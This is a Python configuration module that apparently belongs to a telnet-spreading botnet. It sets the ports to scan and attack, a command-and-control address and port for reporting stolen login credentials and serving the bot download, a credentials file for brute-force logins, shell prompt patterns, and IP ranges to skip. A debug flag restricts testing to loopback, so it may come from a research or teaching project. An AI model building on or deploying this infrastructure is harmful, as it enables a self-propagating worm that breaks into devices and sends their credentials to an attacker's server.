# Contains definitions and constants for other modules

# Used to prohibit the bot from executing certain tasks
# Includes: scanning random IP addresses, downloading and executing
# on remote host, etc.
DEBUG = True

# List of ports to scan and attack (currently only supports telnet)
ATTACK_PORTS = [23]

# versions of python that will run the bot
# currently limited to 2.7 due to use of telnetlib and way in which
# checksums are produced in checksum.py
PYTHON_WORKING_VERSIONS = ['2.7']

# The following settings should be configured based on how you wish
# to set up your CNC infrastructure
# CNC_SERV_ADDR and DOWNLOAD_ADDR may be the same depending on how you
# configure your servers

# Set where you report bot credentials (also hosts bot for download)
CNC_SERV_ADDR = '10.0.0.1'
# Set CNC port to connect for delivering bot credentials
CNC_SERV_PORT = 4444
BOT_NAME = 'bot.tar.gz'

# Set path for file containing login credentials
AUTH_PATH = './auth.txt'

# simplifies IP header encoding/decoding
IP_HEADER_LEN = 20
TCP_HEADER_LEN = 20
MIN_PORT = 1024
MAX_PORT = 65535
MAX_WIN_SIZE = 5840
# List of IP address prefixes to avoid
# Includes IANA reserved, department of defense, etc.
IP_PREFIX_BLACKLIST = [
    3, 6, 7, 11, 21, 22, 26, 28, 29, 30, 33, 55, 56, 214, 215
]
ICMP_ECHO_REQ = 8
LOOPBACK_ADDR = '127.0.0.1'

# Use this in debug mode to try the different tasks on machines of
# your choosing rather than random ones
TEST_ADDR = LOOPBACK_ADDR

# used for port-scan module
MAX_SCANS = 2
PORT_STATE = {
    'OPEN': 0,
    'CLOSED': 1,
    'FILTERED': 2
}
RESPONSE_TYPE = {
    'OK': 0,
    'DENIED': 1,
    'NO_RESPONSE': 2,
    'OTHER': 3
}

# Generic timeout length for socket connections
TIMEOUT_LEN = 2

# Needed to support brute logins
PROMPT = ['>', '#', '$', ':']
